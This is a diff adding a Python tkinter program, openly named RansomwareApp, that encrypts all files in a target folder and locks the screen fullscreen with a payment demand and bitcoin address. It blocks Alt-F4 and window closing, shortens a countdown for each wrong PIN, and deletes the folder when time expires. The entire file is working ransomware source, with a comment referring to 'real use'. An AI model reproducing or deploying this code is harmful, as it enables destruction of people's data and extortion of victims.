@@ -1,0 +1,153 @@
+import os
+import sys
+import time
+import shutil
+import threading
+from cryptography.fernet import Fernet
+import tkinter as tk
+from tkinter import simpledialog, messagebox
+
+# Constants
+PIN_CODE = "1234"
+BITCOIN_ADDRESS = "bitcoin_address"
+PAY_TEXT = "Pay now or lose"
+TARGET_FOLDER = "work secrets"
+TIMER_HOURS = 4
+
+# Generate or load encryption key
+key_file = "secret.key"
+
+def load_key():
+    if os.path.exists(key_file):
+        with open(key_file, "rb") as f:
+            return f.read()
+    else:
+        key = Fernet.generate_key()
+        with open(key_file, "wb") as f:
+            f.write(key)
+        return key
+
+key = load_key()
+cipher = Fernet(key)
+
+# Encrypt folder files
+def encrypt_folder(folder):
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            try:
+                path = os.path.join(root, file)
+                with open(path, "rb") as f:
+                    data = f.read()
+                encrypted = cipher.encrypt(data)
+                with open(path, "wb") as f:
+                    f.write(encrypted)
+            except Exception as e:
+                pass  # Ignore errors silently
+
+# Decrypt folder files
+def decrypt_folder(folder):
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            try:
+                path = os.path.join(root, file)
+                with open(path, "rb") as f:
+                    data = f.read()
+                decrypted = cipher.decrypt(data)
+                with open(path, "wb") as f:
+                    f.write(decrypted)
+            except Exception as e:
+                pass  # Ignore errors silently
+
+# Delete folder if timer ends
+def delete_folder(folder):
+    try:
+        shutil.rmtree(folder)
+    except Exception:
+        pass
+
+# Main App Class
+class RansomwareApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.attributes('-fullscreen', True)
+        self.root.configure(bg='red')
+        self.root.title("Your PC Has Been Locked")
+        self.root.protocol("WM_DELETE_WINDOW", self.block_event)
+        self.root.bind("<Alt-F4>", self.block_event)
+        self.root.bind("<Control-Key>", self.block_event)
+
+        # Text
+        self.label1 = tk.Label(root, text=PAY_TEXT, font=("Arial", 30, "bold"), fg="white", bg="red")
+        self.label1.pack(pady=20)
+
+        self.label2 = tk.Label(root, text=BITCOIN_ADDRESS, font=("Courier", 24), fg="white", bg="red")
+        self.label2.pack(pady=10)
+
+        self.timer_label = tk.Label(root, text="", font=("Arial", 40, "bold"), fg="white", bg="red")
+        self.timer_label.pack(pady=40)
+
+        self.status_label = tk.Label(root, text="Enter PIN to decrypt:", font=("Arial", 20), fg="white", bg="red")
+        self.status_label.pack(pady=10)
+
+        self.input_entry = tk.Entry(root, font=("Arial", 24), show="*")
+        self.input_entry.pack(pady=10)
+        self.input_entry.focus()
+
+        self.input_entry.bind("<Return>", self.check_pin)
+
+        self.wrong_attempts = 0
+        self.hours_left = TIMER_HOURS
+        self.timer_running = True
+
+        # Encrypt folder immediately
+        if os.path.exists(TARGET_FOLDER):
+            encrypt_folder(TARGET_FOLDER)
+
+        # Start timer thread
+        self.update_timer()
+    
+    def block_event(self, event=None):
+        return "break"
+
+    def update_timer(self):
+        if self.hours_left <= 0:
+            # Time’s up — delete folder & exit
+            delete_folder(TARGET_FOLDER)
+            messagebox.showerror("Ransomware", "Time expired. Files deleted.")
+            self.root.destroy()
+            sys.exit()
+        else:
+            self.timer_label.config(text=f"Time left: {self.hours_left} hour(s)")
+            if self.timer_running:
+                # Reduce time every 60 seconds for demo (change to 3600 for 1 hr in real use)
+                self.root.after(60000, self.reduce_timer)  # 60,000 ms = 1 minute
+
+    def reduce_timer(self):
+        self.hours_left -= 1
+        self.update_timer()
+
+    def check_pin(self, event=None):
+        entered = self.input_entry.get()
+        if entered == PIN_CODE:
+            # Correct PIN - decrypt and close
+            if os.path.exists(TARGET_FOLDER):
+                decrypt_folder(TARGET_FOLDER)
+            messagebox.showinfo("Ransomware", "Correct PIN entered. Files decrypted. System unlocked.")
+            self.timer_running = False
+            self.root.destroy()
+            sys.exit()
+        else:
+            # Wrong PIN - cut one hour and prompt again
+            self.wrong_attempts += 1
+            self.hours_left -= 1
+            if self.hours_left < 0:
+                self.hours_left = 0
+            self.status_label.config(text=f"Wrong PIN. Try again! Hours left: {self.hours_left}")
+            self.input_entry.delete(0, tk.END)
+            self.update_timer()
+
+# Run the app
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = RansomwareApp(root)
+    root.mainloop()
